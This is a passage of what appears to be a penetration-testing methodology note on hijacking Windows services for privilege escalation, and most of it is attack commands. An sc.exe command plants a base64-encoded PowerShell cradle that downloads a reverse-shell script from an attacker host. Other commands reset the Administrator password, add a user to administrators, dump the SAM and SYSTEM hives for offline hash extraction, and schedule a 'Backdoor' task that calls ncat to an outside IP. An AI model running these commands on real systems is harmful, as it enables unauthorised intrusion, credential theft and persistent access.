- NetworkService — has restricted local privileges but has network access, and is identified on the LAN by the machine account name (`DOMAIN\MACHINENAME$`).
- LocalSystem — the highest privilege level that exists on the local OS.

##### Running After the First Failure method
![](<../Assets/Windows Methodology/Pasted image 20260603084318.png>)
In the **Recovery** tab, a service can be configured to `execute another program` after the first failure. If you have `sc config` rights on a service running as `LocalSystem`, you can hijack its execution:
#### Powershell-Based (Encrypted Reverse Shell)

On local machine (ecnrypt command). Payload could be easily built using **`Nishang`** project.
```bash
echo -n "IEX (IWR http://<local ip>:<port>/reverseshell.ps1 -UseBasicParsing) | iconv -t UTF-16LE | base64 -w 0"
```
Insert it (before start listener on the local machine)
```powershell
sc.exe config VulnerableService binpath= "cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADQAMAA6ADkAMAAwADEALwByAGUAeAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAA=="
```
##### Command-Based user assignment (changing password) 
Check who is running the service:
```powershell
Get-CimInstance Win32_Service -Filter "Name='UsoSvc'" | Select-Object Name, StartName, State, StartMode
```
```powershell
sc.exe config VulnService binPath= "cmd.exe /c net user Administrator NewPass123!"        # change a password
sc.exe config VulnService binPath= "cmd.exe /c net localgroup administrators john /add"   # add yourself to admins
```
Restart the service to trigger it:
```powershell
sc.exe stop VulnService
sc.exe start VulnService
```
**Dumping hashes via the same technique:**
```bash
sc.exe config VulnService binPath= "cmd.exe /c reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\system.hive"
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---
##### Persistence / Backdoors
```powershell
schtasks /create /tn "Backdoor" /sc ONSTART /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
######### Changing an existing task ################
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```
